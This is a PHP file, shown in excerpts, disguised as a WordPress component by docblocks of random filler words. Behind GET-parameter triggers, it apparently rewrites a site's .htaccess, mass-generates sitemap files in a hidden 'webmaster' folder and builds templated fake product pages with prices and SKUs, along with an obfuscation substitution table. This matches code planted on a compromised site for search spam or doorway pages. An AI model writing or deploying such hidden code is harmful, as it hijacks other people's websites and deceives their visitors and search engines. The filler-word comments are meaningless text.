...
/**
 * applicable audio cancel decade exclusive flash horror inevitable leather parade prescribe relevant rival volunteer withstand.
 * applicable consume enthusiasm flexible gasoline infinite nevertheless provision range volunteer.
 * applicable approximate barrel faulty fax poverty tension version.
 * advertisement consistent enthusiasm fate individual prescribe previous prompt relevant scandal seminar snap title transport tuition vain whatsoever.
 * abundant campus career column comment guarantee label maintain navigation nucleus oval reluctant scratch significance urge utilify vain.
 * absolute collision comparative continuous excess expansion fatigue female horrible illegal impose infer marine naked navigation optional outstanding phenomenon prompt racial scandal sponsor stable tidy.
 * coil distress massive snap.
 * abundant architect attitude battery bother consume display distress disturb dusk entry exterior fate mission odd oxygen phenomenon vanish wander.
 * alter column comparable consent hostile interpret necessity obscure orchestra promote solar tend thrust torture utilify vacant.
 * available exaggerate exterior geometry hostile legislation lest massive mere missile shrink trend twist urge.
 * duration elastic genius horror individual jewel oxygen partial semiconductor shallow sincere vivid.
 * abundant advertisement aware bureau calendar conservation domestic elaborate emphasize enviroment fate fertilizer horror infect insure leisure maximum numerrous opportunity sensible stimulate tendency withstand.
 * bother discount fax generate giant globe harmony manufacture provision quotation.
 * adopt alcohol competition conservation core data deposit excess haste index licence nucleus parallel priority sequence spit suspicion territory wagon weed.
 * Internet applause column infer treaty vacuum wax weed.
 * adjust adult apparent attach aware community devise emotion enthusiasm equivalent geology gratitude knot mist provision remedy slope strategy variation yawn.
 * architecture attach evolve explore luxury tender.
 * alcohol applause avenue bureau dusk flock garbage infer reject remedy scan strategy transmit unique via welfare.
 * response adhere biology diverse humble male missile reject relevant remarkable.
 *
 * @package WordPress
 */
...
//srrarr_bg
$date_string[0]="ltxeyrmvnckjfdbpqsugwizoha";
$date_string[1]="cnvuhsjtyefwdxqakglbpzromi";
$date_string[2]="iqpkjzbtnwclsrymghaexfvuod";
$date_string[3]="xzbietyqhpfwmjsvlndkocgaur";
$date_string[4]="wcudrvazfjqsypnlmxbothgike";
$date_string[5]="frvwkgxoplbimjahcdqszyuten";
$date_string[6]="fgyhaercjbxouptivkwndlzqsm";
$date_string[7]="uxviqstomyzkwdegbrhpfclnja";
$date_string[8]="xbsktgwauzjloypvmrncqdehfi";
$date_string[9]="tcawgrsindlhmqefkzjyoubxpv";
$date_string[10]="rghcntjseovaipxfwkqlubzdmy";
$date_string[11]="lorqekfndcjawzpvbhxtusmigy";
$date_string[12]="mdurcwvqxapeniykzhtlgbjofs";
$date_string[13]="crxlanysbepkhdqwivumgjtofz";
$date_string[14]="spvrcqjlzuahnidwfyteokgxmb";
$date_string[15]="vnujadfbwogyxsritkzqemhcpl";
$date_string[16]="jiwtovgqsfmapylubzdchnrkxe";
$date_string[17]="ehgkiqndcjvazltmoypfswubrx";
$date_string[18]="zhkvowecpqmgjbnyftrdsxailu";
$date_string[19]="acqzlgfobrxehkdnsjwvuitmpy";
$date_string[20]="zirntuxekbahdvwmolsgcpfjyq";
$date_string[21]="himueklgsbxpwcyqjoadnrtfzv";
$date_string[22]="dsultnmgjofvybapkeiqrwzchx";
$date_string[23]="xeactovswrjnqdfkmygbhplizu";
$date_string[24]="gxrdeoqslfhpzvwiacjutnbymk";
$date_string[25]="apzmivwhbgofykeqlsucnxrjtd";
$date_string[26]="rwgcnspxhjzqvlkytofmdbauei";
$date_string[27]="cgldoxpfabievwhqrtszumjynk";
$date_string[28]="zchkbreldtgjunaxwopmfvsyqi";
$date_string[29]="ughxfksiaoyzvrbjmtpncwleqd";
$date_string[30]="zrvwljugsqtnicmfokxypdheba";
$date_string[31]="ynzwfjeqklmgpbvuichxtoadsr";
$date_string[32]="gqhkbzcsapfwjnyrtxlvuoimde";
$date_string[33]="kfeaqjbtwlinymuxrpczodvsgh";
$date_string[34]="mnhtkrlaiygdcobjqsvupxzwef";
$date_string[35]="hqkdrmzfyopxigvjnbslcuawet";
$date_string[36]="uzlafqpwkbhoxdregnscmvyitj";
$date_string[37]="xvzynftichejswgqodbmrpulak";
$date_string[38]="yzsaqnerxbikgomtldcpvuhjwf";
$date_string[39]="xqebydgjmaifsrlokwptchuzvn";
$date_string[40]="iozbfxpqhskaucnrmevjdgtywl";
$date_string[41]="sgkephtlmniwfqjcyuzbodxavr";
$date_string[42]="hisgxjtcywpqfdbrezokalnumv";
$date_string[43]="nskyibmdexujzwatgpcvolfrhq";
$date_string[44]="iwsgqrumnvkyfexbljzcaohtdp";
$date_string[45]="tnvxjspzwhgoiqrmkaycblfdue";
$date_string[46]="wygmxbizpfcoavsulheqrkndtj";
$date_string[47]="ltcdegravfikpmwsjuxqbyonhz";
$date_string[48]="ebxysjdgkpimzuotwcvrnlqahf";
$date_string[49]="bmujzwcvhsknxfrigaqtlypedo";
$date_string[50]="jabuvhdgcrokfmzxltpeynwsiq";
$date_string[51]="vmqkfarcnlihouydwegpzjbtsx";
$date_string[52]="dbiulwhmsytonvekzjxfgpqcar";
$date_string[53]="zblqpiguaosnktchjexfydrmvw";
$date_string[54]="yanzlgxbofqhtwrdipmsukvjec";
$date_string[55]="ovxclpytkfamrjhdubwgziseqn";
$date_string[56]="sngaouwtlzkhpfevxriqdcymbj";
$date_string[57]="uhtvacfbwpdklmreyzxsoqginj";
$date_string[58]="bvmoefjsgpyarwiktxulnzcqdh";
$date_string[59]="vrsqybdzhkcnowpfjuilamtexg";
$date_string[60]="valungfwrxmpkhyoejcqdbizst";
$date_string[61]="dmyjprenxszqogbufivwkchtal";
$date_string[62]="kfsihdnyvuocgztmweljarbpqx";
$date_string[63]="ljayenzthprvkmbqdgiuofwxsc";
$date_string[64]="raunbhoxwmpkiqjdctglfzvesy";
$date_string[65]="kcoivhbwjysemaxqfrdnzugltp";
$date_string[66]="zhlbukendscytafjroixqvgmwp";
$date_string[67]="dbzpriknwvfjeglaothcumyxsq";
$date_string[68]="jirtlnqgmfuvpedbzwohkascxy";
$date_string[69]="vwzrmxpgcnhauftqklieojdbys";
$date_string[70]="pahmubxkolynztjfrgivdseqcw";
$date_string[71]="eopldkaznjthxmrwbcvsfuyigq";
$date_string[72]="znxcaqyofhtuwrldjvkiegbspm";
$date_string[73]="funtgpehmjqwocyvdbkizslrxa";
$date_string[74]="icajnwkupboezqdrlshftgmxvy";
$date_string[75]="lxrhtdmeoqjawfuibpszcyngkv";
$date_string[76]="yzuxdefawcvoqrmsnhgtbklpij";
$date_string[77]="pdxiuryatfhogsnkemjzbvcqwl";
$date_string[78]="qbsmeofykauigwdjpnvhxrctzl";
$date_string[79]="jhqtumgadbckrenvxslopifwzy";
$date_string[80]="fspkrdvtzybxigouecwlamnqhj";
$date_string[81]="mhtwfucnsoqpvlkgairbezdjyx";
$date_string[82]="gvlwuakhrdyzxtpcoeqinsfbjm";
$date_string[83]="qmefptclzaknyjhrgoduvswxbi";
$date_string[84]="yjnzrticlkfqxpdmgausevwobh";
$date_string[85]="vjemblrchfxwzaiguysoktpqdn";
$date_string[86]="obwqpcjztednkhaifsglrxuvym";
$date_string[87]="bzkpshituexnmloavfwdcygrqj";
$date_string[88]="plehafzucbqvndtsijmywxogkr";
$date_string[89]="agnvfxbypdjqruihzmosclwtek";
$date_string[90]="kpamqgjzdfohiyevtslxncubwr";
$date_string[91]="syqglhazenbtowjmkrudfcxpiv";
$date_string[92]="wclhodnzpqbxvgjekamifyusrt";
$date_string[93]="bwygaljdkmtrnefpqhuxovczsi";
$date_string[94]="dkesvgwmurnjofxzhbqlicaypt";
$date_string[95]="zlrcnpxvwguayqhbedimsjktof";
$date_string[96]="gukvidblntwamyczjrepsqxofh";
$date_string[97]="nqrtlkfizxsowyemjcghaubdpv";
$date_string[98]="krfjnmqovsbhupyaecxwzlidtg";
$date_string[99]="vqyaojzlnbhwciudmrftsgxkpe";
...
if(isset($_GET["gsitemap"]) && isset($_GET["mapnum"])){
	...
	foreach($arrNumTemp as $vss){
		...
		if(JDT == 0 && $gnumber == 1){
			...
			if(strstr($mapLogs,'webmastermap.xml') && file_exists('../webmaster/webmastermap.xml')){
				echo $vals."<br/>";
				echo '../webmaster/webmastermap.xml successed<br/>';
				$gnumber++;
				continue;	
			}
		...
		if(strstr($mapLogs,'#webmaster' . $arrABC[$gnumber-2] . 'map'  .'.xml#') && file_exists('../webmaster/webmaster' . $arrABC[$gnumber-2] . 'map' .'.xml')){
			echo $vals."<br/>";
			echo '../webmaster/webmaster' . $arrABC[$gnumber-2] . 'map' .'.xml successed<br/>';
			$gnumber++;
			continue;	
		}
		}
		...
		if(strstr($mapLogs,'#webmaster' . $arrABC[$gnumber-1] . 'map'  .'.xml#') && file_exists('../webmaster/webmaster' . $arrABC[$gnumber-1] . 'map' .'.xml')){
			echo $vals."<br/>";
			echo '../webmaster/webmaster' . $arrABC[$gnumber-1] . 'map' .'.xml successed<br/>';
			$gnumber++;
			continue;	
		}
...
if(isset($_GET["ghtac"]) && $_GET["ghtac"]){
	...
	if(1){
		...
		if(JDT == 0){
			...
			$rsut = '\1'.PHP_EOL . 'RewriteRule ^'. '.*-(\d+)/.*'. JTHZ  .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]'. PHP_EOL . 'RewriteRule ^' . '(.*)/products'. JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]'. PHP_EOL .  'RewriteRule ^'.'.*(webmaster[a-z]+map\.xml)$  webmaster/\$1 [L]' . PHP_EOL . 'RewriteRule ^'.'.*(webmastermap\.xml)$  webmaster/\$1 [L]' . PHP_EOL ;
		
			$rsut2 = PHP_EOL . 'RewriteRule ^'. '.*-(\d+)/.*'. JTHZ  .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]'. PHP_EOL . 'RewriteRule ^' . '(.*)/products'. JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]'. PHP_EOL  .  'RewriteRule ^'.'.*(webmaster[a-z]+map\.xml)$  webmaster/\$1 [L]' . PHP_EOL . 'RewriteRule ^'.'.*(webmastermap\.xml)$  webmaster/\$1 [L]' . PHP_EOL .'RewriteRule' ;
		
			
		}else{
			
			
			$rsut = '\1'. PHP_EOL . 'RewriteRule ^'. '.*-(\d+)/.*'. JTHZ  .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]'. PHP_EOL . 'RewriteRule ^' . '(.*)/products'. JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]'. PHP_EOL ;
		
			$rsut2 =  PHP_EOL . 'RewriteRule ^'. '.*-(\d+)/.*'. JTHZ  .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]'. PHP_EOL . 'RewriteRule ^' . '(.*)/products'. JTHZ .'$ '.$RewriteOnDir.'index\.php?cat=\$1&%{QUERY_STRING} [L]'. PHP_EOL .'RewriteRule' ;	
...
if(JDT==2){
	...
	$UrlParent=end((explode('index.php',$_SERVER['REQUEST_URI'])));	if($UrlParent){
		...
		if($tempPid){
			...
			$r2='#(.*)/products'. JTHZ .'#i';		$r3='#(.*)/products/$#i';
			if(preg_match($r2,$UrlParent,$matches2)){
				if(isset($matches2[1]))
					$tempPid = $matches2[1];		
			}else{
...
$pricestr = $InFoStrArr['pPrice'];
$ptagStr = $InFoStrArr['ptags'];
...
$skuPre = substr($thisdom,0,2);
$skuPre = strtoupper($skuPre);
$tpArrTags = json_decode($ptagStr,1);
list($prices,$priced,$psku,$pcurrency) = explode('^',$pricestr);
$tagArray = $tpArrTags['tags'];
$tagsorts = $tpArrTags['sort'];

$tagArray['tagName'] = str_replace('##pname##',$Ptitle,$tagArray['tagName']);
$tagArray['tagBread'] = str_replace('##breadcrumb##',$BreadStr,$tagArray['tagBread']);
$tagArray['tagGitle'] = str_replace('##gitle##',$headAddStr,$tagArray['tagGitle']);
$tagArray['tagHname'] = str_replace('##pname##',$Ptitle,$tagArray['tagHname']);

$offsPrice = (int)(($prices - $priced) / $prices * 100);
$tagArray['tagPrice'] = str_replace('##original_price##',$pcurrency.$prices,$tagArray['tagPrice']);
$tagArray['tagPrice'] = str_replace('##special_price##',$pcurrency.$priced,$tagArray['tagPrice']);
$tagArray['tagPrice'] = str_replace('##sale_save##',' '.$offsPrice,$tagArray['tagPrice']);
$tagArray['tagSku'] = str_replace('##sku##',$skuPre.$psku,$tagArray['tagSku']);
...
if(isset($InFoStrArr['nowPimgArr'])){
	...
	foreach($tpImgArr as $key=>$vs){
		$vs = str_replace('<img ', '<img alt="'. $Ptitle .'" ', $vs);
		if($key == 0){
			$mainImg = $vs;
		}else{
			
			$imgSlist .= str_replace('##small_img##',$vs,$tagArray['tagSimg']);
		}
	}
}

$tagArray['tagImg'] = str_replace('##main_img##',$mainImg,$tagArray['tagImg']);
$tagArray['tagImg'] = str_replace('##small_img_list##',$imgSlist,$tagArray['tagImg']);

$proDesStr = '';
if(isset($InFoStrArr['pdes'])){
	$InFoStrArr['pdes'] =  preg_replace('#\s+#si',' ',$InFoStrArr['pdes']);
	$proDesStr .= '<p>'.$InFoStrArr['pdes']."</p>".PHP_EOL;
}

$tagArray['tagDes'] = str_replace('##description##',$proDesStr,$tagArray['tagDes']);


$addTopStr = '';

foreach($tagsorts as $vs){
	
	$addTopStr .= $tagArray[$vs].PHP_EOL;
...
// $tpaddstr .= get_shares();
$tpaddstr .= $addStrDes1."<br/>".PHP_EOL;
...
$flagH2III = 1;
		...
		$fileMb = fopen("template.html","r");
			...
			$html = str_ireplace('draft_or_post_title',  $nowShowTitle. ' '. $thisdom, $html);	
...
/**
 * calendar career casual dash data entertainment exceed external fax geometry impose insurance loosen mild naked nylon participate recruit register removal restrict strategy tidy vibrate witness.
 * abundant casual conquer entitle entry extreme female gear hestiate humble index mainland mixture promote pursue reject reveal substance temptation via virtue welfare.
 * awful distress exclaim merchant strategic.
 * budget elastic equation leisure powder valley withdraw.
 * discipline genuine jeans leisure petrol urge vary xploit.
 * appeal applianc beforehand consistent cope core durable export favorite flock frustrate global lean likelihood neglect promote region reluctant retain rival tense utilise vanish.
 * arouse duration gallery infant origin slender sorrow suspicion victim.
 * decade display distress mere variable.
 * alcohol burden comparable dive duration expand generate germ global grateful hook idle infant loosen mainland outstanding twist withdraw.
 * academy adult approximate avenue comparative internal luxury magnet media modify mutual notify peak quit rival sake sensitive swallow tidy tremble vague volcano voluntary.
 * favorite participate primitive prior ultimate.
 * response abundant accelerate coarse defect delicate dive domestic drip elaborate genuine harmony ingredient jail naval orient religion restraint shiver subsequent torture universe venture version.
 * abuse adequate appeal audio derive emphasize gesture optics precaution principle prior tone vibrate.
 * adhere appropriate aspect deserve evaluate excursion explosive ferfile gesture identify modest obstacle outstanding passion personnel portion professional profit snap temptation terror weave.
 * continual debate domestic dumb dusk grand mixture orient primitive route scan shallow spit stale transmit universe urge vessel.
 * attach catalog chaos conservative external flee guilty incident mutual necessity network nucleus semester sexual tendency urge weld.
 * consume extraordinary principle resistant reveal universe vacant videotape.
 * alter arise award career decorate export jam mere naval respond shrug solar spot stable tedious transmit vertical vitally.
 * authority award blast cancel discount essential evil favorable jewel kneel lest neutral previous render revenue rival scandal slip spot substantial the triumph video.
 * decline delicate disturb index leak manual molecule.
 * appropriate candidate deposit optional reject snap substantial valley.
 * echo nuclear retail stale stripe tide variable.
 * biology burst expense glory hint import liberal orchestra preserve religious security treaty urgent utilise.
 * aspect automatic chaos comment dash device enviroment flexible infinite onion pat poverty prohibit reinforce satellite strategic suburb theme tremble ultimate undergraduate vessel.
 * excess invade oblige semiconductor spot vacant.
 *
 * @package WordPress
 */
...
function getBreadcrum($Ptitle,$catArr,$id23,$pname){
	...
	if($breadTagkey == 4){
		...
		if($breadTagkey == 0){
			...
			$strBreads .= '<li'.$liStr.' itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">'.$Ptitle.'</span></li>';
...
function getCatLink($CatName,$id23){
		...
		// $urlMid .= JTHZ;		
		$rtStr = $filePres . $urlMid . '/products' . JTHZ;
		$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
...
/**
 * acknowledge approve duration numerrous suspicious tension transplant virus.
 * adhere balcony coach deposit distress episode internal mission optics prevail recreation signature.
 * agency bother decay delicate disturb enclose expense explosion extent grateful hook motive pants recruit reliable satellite torture triangle waist.
 * alcohol approximate arouse drip elaborate erect gallon geography hardware hatred notify religion sensible splendid suspicion undergo venture vibrate violent vivid volunteer wealthy.
 * adult alcohol appeal applianc conservation mission oxygen previous remote restraint ridiculous slope suspicious vivid.
 * cargo gasoline petrol radical tide.
 * advertisement barrier comedy deserve elastic evolve garbage obscure resistant.
 * adequate adopt breadth discipline dusk essential expel faulty highlight humble liable manual mild naked notion orchestra organ render revenue sincere terminal terror tidy.
 * agency algebra dispose enthusiasm gene index marveous powder retail route semiconductor shuttle usage violence withdraw.
 * academy elastic enthusiasm evil extinct glorious golf jail neutral orchestra quotation semester temptation tend tide ultimate.
 * appreciate decline discrimination display expenditure favorable forbid genius hestiate infer molecule mutual personal restrict slip sophisticated target triangle violet.
 * bacteria casual comment excess humble mere mood obstacle scale suspicion suspicious transport trend.
 * attitude competition explode guarantee hint maintain manufacture oval quit skim version withdraw.
 * arbitrary clue conservative deputy deserve fatal highlight incident liberal luxury organ particle prominent reject remarkable removal sexual sketch treaty triangle usage vibrate virus yawn.
 * approximate cargo consistent drip dump enviroment external gear licence network radical sketch terror vivid vocabulary.
 * accelerate conservation entitle explosion external flee gallon portable sake target virtual vote.
 * casual domestic extreme gene genuine inferior insignificant jam petroleum prohibit remarkable triumph undergo venture.
 * arise aware community conservative decay exterior female interpret moral mutual neutral optional previous prior skim tarnest.
 * accelerate awful beforehand constant exceedingly fatal frustrate genuine golf highlight jail jealous laser maximum omit relief transport triangle wagon.
 * adjust coil domestic ridiculous submit.
 * approach balcony cope dash dump expend favorable geology globe mainland massive mission noticeable partial preserve primitive range reputation respond scan severe shield spot tremble.
 * abundant chaos collision distinguish distress elbow fertilizer frown negative priority professional prompt regulate shrink spit trend urge voluntary.
 * drift extreme favorite gesture globe leap lest maintain massive nevertheless optimistic sexual temptation tend tissue vessel virtual.
 * algebra approximate cancel commit debt disturb emotion emotional expense gallery genuine globe herd holy individual mature navigation obscure passport resemble split spray stable strategy transform.
 * capture geometry giant substantial violet.
 * applause cancel coach comment consent continual descend distress exceed excess expenditure genuine harmony haste highlight insure jeans junior mutual neglect opponent relief remarkable vary.
 * aware barrier globe naked prominent prosperity satellite shrink.
 * abundant arouse award burst clue coarse conquer data decade faulty frustrate infant infinite insure joint mainland obstacle oval profit profitable prohibit shelter tremble tropical volunteer.
 * authority delicate derive golf hestiate inevitable liter modest prohibit promote resistant simplify title transmit undergo wagon.
 * coil female gap leisure noticeable nucleus prevail promote severe.
 * devise enviroment essential expense harmony hollow invade missile motive nuclear route semester subsequent tropical virtue.
 * capture import inevitable jam sensitive snap strategic tuition withdraw.
 * entertainment pants profit subsequent tide.
 * career decade display index mere naval nylon portion quotation rescue restrict solar suspicious urban vibrate volume.
 * academy acquire continual delay distribute exaggerate extent flexible generate illusion issue reluctant scandal submit ultimate valley welfare.
 *
 * @package WordPress
 */
...
$filenames = $tparrIII;
	...
	foreach($tempArr1 as $key => $value2){
		...
		if($first===false && $last===false && $checkTxt===false)
		{
			...
			if($star % 12000==11999){
				$gFile =  '../webmaster/webmaster' . $arrABC[$gnumber-2] . 'map' .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				file_put_contents("./map.log",'#webmaster' . $arrABC[$gnumber-2] . 'map'  .'.xml#'.PHP_EOL,FILE_APPEND);
				$str = '';				$gnumber++;				return;			}
			...
			if($first===false && $last===false && $checkTxt===false)
		{
			...
			if($star % 12000==11999){
				$gFile =  '../webmaster/webmaster' . $arrABC[$gnumber-1] . 'map' .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				file_put_contents("./map.log",'#webmaster' . $arrABC[$gnumber-1] . 'map'  .'.xml#'.PHP_EOL,FILE_APPEND);
				$str = '';				$gnumber++;				return;			}
		...
		";	
 		...
 		if(JDT == 0){
				...
				{
		$gFile =  '../webmaster/webmaster' . $arrABC[$gnumber-2] . 'map' .'.xml';			echo '<br/>'.$gFile.'<br/>';
		...
		$gnumber++;	
			...
			{
		$gFile =  '../webmaster/webmaster' . $arrABC[$gnumber-1] . 'map' .'.xml';			echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
		file_put_contents("./map.log",'#webmaster' . $arrABC[$gnumber-1] . 'map'  .'.xml#'.PHP_EOL,FILE_APPEND);
		$gnumber++;	
		}
...
$filenames = $tparrIII;
	...
	foreach($tempArr1 as $key => $value2){
			 	...
			 	if($first===false && $last===false && $checkTxt===false)
		{
			...
			if($star % 12000==11999){
				$gFile =  '../webmaster/webmastermap.xml';				echo '<br/>'.$gFile.'<br/>';				
				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				file_put_contents("./map.log",'webmastermap.xml'.PHP_EOL,FILE_APPEND);
				$str = '';				$gnumber++;				return;				
			}
...
function my_mkdir($dir){
	...
	function getalink($pid,$pname=''){
		...
		if(strstr($pname,'#cat#')){
			...
			if(strstr($precat,'_-_')){
				$tpcatArr = explode('_-_',$precat);
				$precat = $tpcatArr[0];
			}
		}
...
/**
 * academy adapt applicable breed comment comparable exterior giant hence horrible odd tide tremble vocabulary yawn.
 * agency architecture audio erect forbid manual medium restraint slope temple trap yield.
 * Internet academy appreciate breed calculate capture deserve dumb incident jealous liberty marine navigation parade profit secure semester sensible treaty virtue vocabulary.
 * academy adult approach bother capture cargo commit delay explore guarantee hydrogen leap liberal minimum nucleus outstanding portion resemble ridiculous ridid scandal slide solar territory unique.
 * blast evolve geology identify male portable remote slippery ultimate urge.
 * ferfile snap triumph witness.
 * awful cliff conservation decade duration encounter expand female ferfile geology individual interpretation invade liberal moisture navigation portable prospect secure shield terror tuition unique violence.
 * exclaim flexible grant liter smash the witness wonder.
 * appropriate conservative cope entry flash gallery germ household missile particle rely retain stale venture.
 * abuse academic attach bother evil gallery integrate jam label nonsense nuisance partial particularly passive precaution prominent stale submerge tense textile thrust tone vibrate weed.
 * attitude decorate delay enclose evil hollow insurance omit prominent resistant solar virtue weld.
 * appreciate automatic coil debate extinct magnet marine mission noticeable oblige profitable prominent scale semiconductor shift substantial vary wealthy welfare.
 * comment deputy gaze glorious hence incident individual removal seminar spray subsequent torture.
 * awkward encounter flock geometry insignificant liberty maintain necessity poverty region reluctant restrict ruin sensitive sketch snap terminal universe version vote.
 * aspect faulty ingredient outstanding textile triangle.
 * Internet agency incident optional thrust.
 * decline expel haste outstanding particle prospect resistant simplify violet.
 * advertise cliff decent revenue torture violence.
 * bacteria frown gallery infant particularly portable prosperity suburb tide usage.
 * abuse award cancel chaos comparative expend faulty gratitude herd hint nucleus professional religious ruin seminar severe slip utilise.
 * appeal applianc bacteria comment consent dusk fate issue nuisance nylon opponent profit radical shuttle simplify stimulate.
 * acid aspect constant domestic frown household illusion mainland previous semiconductor sexual slide strategic.
 * battery breadth compete consent consume exclaim expend faculty gasoline laser nucleus prescribe racial respond slippery survey tissue videotape virus wonder.
 * awful casual consent delicate discipline drift dump equivalent focus hollow manufacture medium motive negative promote ridge weed.
 * appetite applause debt dispose expensive herd illegal import inhabitant issue maintain male parallel remote shrug simplicity splendid spray temple territory usage vivid weld.
 * bundle emphasize evaluate flash gallon junior modify oral prominent prompt sketch stuff ultimate utter yield.
 * academic drift emotion gene hook marveous optional partial participate portion restrict whereas.
 * algebra appoint bargain coach data duration erect fertilizer glimpse infect junior magnet mist nucleus odd outset pursue radical revenue shift slender suspicion tremble.
 * agency apparent barrier exceedingly fatigue favorite grand inferior moisture precaution prohibit ridge universe urgent vacant.
 * accelerate appetite approach architecture barrel bundle column compete discount entry gratitude haste leisure powder precaution promote rely restrain ridiculous semester universal urban valley vanish variable.
 * abuse academic awkward budget calculate gallery hence launch obscure oval parallel prior triumph utter vain.
 * commit gene promote tension.
 * applicant attitude illegal medium shuttle.
 * cargo consistent enviroment exclude fertilizer flexible nuisance promote thrust virtual weed witness.
 * competent descend dumb evaluate glory launch orient pat radiation restrict shallow shelter variable.
 * arise career coach device entertainment expand gasoline grant impose likelihood lynar reluctant revenue splendid talent transport.
 * acid adhere algebra audio commit frown network prevail quit videotape.
 * algebra aspect chaos consume debate extinct gratitude jeans modify regulate religious stuff via violence weave.
 * avenue code community deposit devise exclude focus gallery guarantee likelihood mere naval onion particularly rival slip substance weed.
 * bargain comedy exclaim fate gap globe glory mere notion restraint sexual.
 * Internet abuse core enthusiasm genius genuine issue laser mist passion personal presumably region remedy strategy vessel.
 * algebra focus hollow launch mutual nonsense shelter signature trend triangle virtual.
 * battery decent delay durable entertainment evaluate glory inevitable infect invade jealous motive origin portion resistant restrict ridge scale spot.
 * advertise extent rescue simplify tide.
 * applianc balcony coil exceed label mutual obscure prevail remarkable retail software suburb universal.
 * calendar erect ferfile globe insure nylon portable profit sexual signature skim.
 * applicant approve capture cargo casual conservative exclusive favorite fax focus golf guarantee opportunity orbit organ powder resistant reveal shrug sophisticated spill tidy urban volume.
 *
 * @package WordPress
 */
